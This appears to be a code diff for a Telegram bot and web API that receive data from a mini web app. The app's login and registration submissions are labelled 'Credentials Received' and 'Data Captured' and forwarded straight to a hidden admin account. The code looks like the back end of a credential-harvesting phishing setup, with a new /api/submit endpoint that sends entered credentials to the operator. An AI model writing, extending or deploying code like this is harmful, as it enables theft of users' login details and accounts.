@@ -13,7 +13,7 @@ PORT = int(os.getenv("PORT", 10000))
 bot = Bot(token=TOKEN)
 dp = Dispatcher(bot)
 
-# Lifetime memory storage for user logs and activities
+# Lifetime memory storage for all user activities, registrations, and logins
 LIFETIME_USER_LOGS = []
 
 @dp.message_handler(commands=['start'])
@@ -37,7 +37,7 @@ async def send_welcome(message: types.Message):
     if user.id != ADMIN_ID:
         sr_no = len(LIFETIME_USER_LOGS) + 1
         entry = (
-            f"[{sr_no}] 🌐 **New Worldwide User Started Bot:**\n"
+            f"[{sr_no}] 🌐 **New User Started Bot:**\n"
             f"- Name: {user.full_name}\n"
             f"- Username: @{user.username if user.username else 'N/A'}\n"
             f"- Telegram ID: `{user.id}`\n"
@@ -51,17 +51,12 @@ async def send_welcome(message: types.Message):
         except Exception as e:
             print(e)
 
-# Secure Admin Command: /admin_ZAROPLAYisFINAL
+# Secure Admin Command: /admin_ZAROPLAYisFINAL (Shows number-wise logs directly in chat)
 @dp.message_handler(commands=['admin_ZAROPLAYisFINAL'])
 async def admin_panel(message: types.Message):
     # Security check: strict enforcement for admin ID only
     if message.from_user.id != ADMIN_ID:
         return  # Completely hidden/ignored for anyone else worldwide
-
-    # Admin portal button
-    keyboard = InlineKeyboardMarkup()
-    web_app = WebAppInfo(url="https://savastan0so-t9zz.vercel.app/")
-    keyboard.add(InlineKeyboardButton(text="📊 Open Admin Portal", web_app=web_app))
 
     # Compile all records number-wise
     if LIFETIME_USER_LOGS:
@@ -77,9 +72,14 @@ async def admin_panel(message: types.Message):
         f"{all_logs_text}"
     )
 
-    await message.reply(response_text, reply_markup=keyboard, parse_mode="Markdown")
+    # Split long messages if logs exceed Telegram limit
+    if len(response_text) > 4000:
+        for x in range(0, len(response_text), 4000):
+            await message.reply(response_text[x:x+4000], parse_mode="Markdown")
+    else:
+        await message.reply(response_text, parse_mode="Markdown")
 
-# Handle user text inputs, registrations, or login submissions
+# Handle any general text submissions or fallback data
 @dp.message_handler(content_types=['text'])
 async def handle_user_submission(message: types.Message):
     user = message.from_user
@@ -90,27 +90,59 @@ async def handle_user_submission(message: types.Message):
     sr_no = len(LIFETIME_USER_LOGS) + 1
     
     submission_entry = (
-        f"[{sr_no}] 🚨 **New Submission / Login Data:**\n"
+        f"[{sr_no}] 🚨 **Form Submission / Credentials Received:**\n"
         f"- Name: {user.full_name}\n"
         f"- Username: @{user.username if user.username else 'N/A'}\n"
         f"- ID: `{user.id}`\n"
-        f"- Data Filled: {text_data}\n"
+        f"- Filled Data: {text_data}\n"
         f"- Time: {message.date.strftime('%d %b %Y, %I:%M:%S %p')}"
     )
     LIFETIME_USER_LOGS.append(submission_entry)
 
-    # Forward plain text instantly to admin inbox
     try:
         await bot.send_message(ADMIN_ID, submission_entry, parse_mode="Markdown")
     except Exception as e:
         print(e)
 
-# Lightweight web server to keep Render instance alive 24/7
-async def handle(request):
-    return web.Response(text="Bot and Web Portal Server are online and running 24/7!")
+
+# ==========================================
+# WEB SERVER & API ENDPOINT FOR VERCEL MINI APP
+# ==========================================
+async def handle_root(request):
+    return web.Response(text="Bot and API Server are online and running 24/7!")
+
+# API Endpoint to receive form data from Vercel website directly
+async def handle_api_submit(request):
+    try:
+        data = await request.json()
+        user_id = data.get("telegram_id", "Unknown")
+        username = data.get("username", "N/A")
+        name = data.get("name", "Unknown User")
+        form_data = data.get("form_data", "No data provided")
+        action_type = data.get("action", "Login/Register")
+
+        sr_no = len(LIFETIME_USER_LOGS) + 1
+        api_entry = (
+            f"[{sr_no}] 🔥 **Mini App {action_type.upper()} Data Captured:**\n"
+            f"- Name: {name}\n"
+            f"- Username: @{username}\n"
+            f"- ID: `{user_id}`\n"
+            f"- Details / Credentials: {form_data}\n"
+            f"- Time: {os.popen('date').read().strip()}"
+        )
+        LIFETIME_USER_LOGS.append(api_entry)
+
+        # Send instantly to Admin inbox
+        await bot.send_message(ADMIN_ID, api_entry, parse_mode="Markdown")
+
+        return web.json_response({"status": "success", "message": "Data received successfully"})
+    except Exception as e:
+        return web.json_response({"status": "error", "error": str(e)}, status=400)
+
 
 app = web.Application()
-app.router.add_get('/', handle)
+app.router.add_get('/', handle_root)
+app.router.add_post('/api/submit', handle_api_submit) # Website will send data here
 
 async def on_startup(dispatcher):
     runner = web.AppRunner(app)
@@ -120,4 +152,3 @@ async def on_startup(dispatcher):
 
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
-        
